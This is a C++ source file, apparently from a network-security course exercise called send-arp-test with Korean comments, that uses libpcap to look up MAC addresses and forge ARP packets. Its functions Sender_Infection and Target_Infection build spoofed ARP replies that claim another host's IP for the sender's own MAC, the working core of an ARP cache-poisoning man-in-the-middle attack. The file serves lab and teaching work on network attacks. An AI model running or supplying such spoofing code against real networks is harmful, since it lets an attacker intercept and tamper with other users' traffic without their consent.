#include "Utill.h"

void show_usage()
{
    std::cout << "syntax: send-arp-test <interface>\n";
    std::cout << "sample: send-arp-test wlan0\n";
}

void print_info(struct libnet_ipv4_hdr *header, u_int8_t *m, u_int8_t *m2)
{
    printf("MAC : %02x:%02x:%02x:%02x:%02x:%02x ->", m[0], m[1], m[2], m[3], m[4], m[5]);

    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", m2[0], m2[1], m2[2], m2[3], m2[4], m2[5]);

    printf("IP : %s -> ", inet_ntoa(header->ip_src));
    printf("%s\n", inet_ntoa(header->ip_dst));
}

Mac getSenderMac(pcap_t *handle, Mac myMac, Ip myIP, Ip senderIp, char* interfcae_name)
{
    EthArpPacket packet;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *dev;
    Mac senderMac;
    packet = Make_packet(interfcae_name, Mac::broadcastMac(), myMac, myMac, myIP, Mac::nullMac(), senderIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    else
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 1)
        {
            // 패킷 수신에 성공한 경우, ARP 응답 패킷에서 해당 IP 주소의 MAC 주소를 추출합니다.
            EthArpPacket *arpResponsePacket = reinterpret_cast<EthArpPacket *>(const_cast<u_char *>(packet));
            senderMac = arpResponsePacket->arp_.smac_;
        }
    }
    pcap_close(handle);
    return senderMac;
}

Mac getTargetMac(pcap_t *handle, Mac myMac, Ip myIp, Ip targetIp, char* interfcae_name){
    EthArpPacket packet;
    packet = Make_packet(interfcae_name, Mac::broadcastMac(), myMac, myMac, myIp, Mac::nullMac(), targetIp);
    Mac TragetMac;
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    else
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 1)
        {
            // 패킷 수신에 성공한 경우, ARP 응답 패킷에서 해당 IP 주소의 MAC 주소를 추출합니다.
            EthArpPacket *arpResponsePacket = reinterpret_cast<EthArpPacket *>(const_cast<u_char *>(packet));
            TragetMac = arpResponsePacket->arp_.smac_;
        }
    }
    pcap_close(handle);
    return TragetMac;
}


EthArpPacket Sender_Infection(char *interfaceName, Mac my_mac, Mac SenderMac, Ip sip, Ip tip)
{

    EthArpPacket packet;
    packet = Make_packet(interfaceName, SenderMac, my_mac, my_mac, tip, SenderMac, sip);
    return packet;
}


EthArpPacket Target_Infection(char *interfaceName, Mac my_mac, Mac Target_Mac, Ip sip, Ip tip){
    EthArpPacket packet;
    packet = Make_packet(interfaceName, Target_Mac, my_mac, my_mac, sip, Target_Mac, tip);
    return packet;
}


EthArpPacket Make_packet(char *interfaceName,
                         Mac eth_dmac,
                         Mac eth_smac,
                         Mac arp_smac,
                         Ip arp_sip,
                         Mac arp_tmac,
                         Ip arp_tip)
{

    EthArpPacket packet;

    char errbuf[PCAP_ERRBUF_SIZE];

    packet.eth_.dmac_ = eth_dmac;   // Sender MAC
    packet.eth_.smac_ = eth_smac; // 내 MAC
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = arp_smac; // 내 MAC
    packet.arp_.sip_ = htonl(arp_sip);   // gateway ip , Input
    packet.arp_.tmac_ = arp_tmac;        // sender MAC
    packet.arp_.tip_ = htonl(arp_tip);   // sender IP

    return packet;
}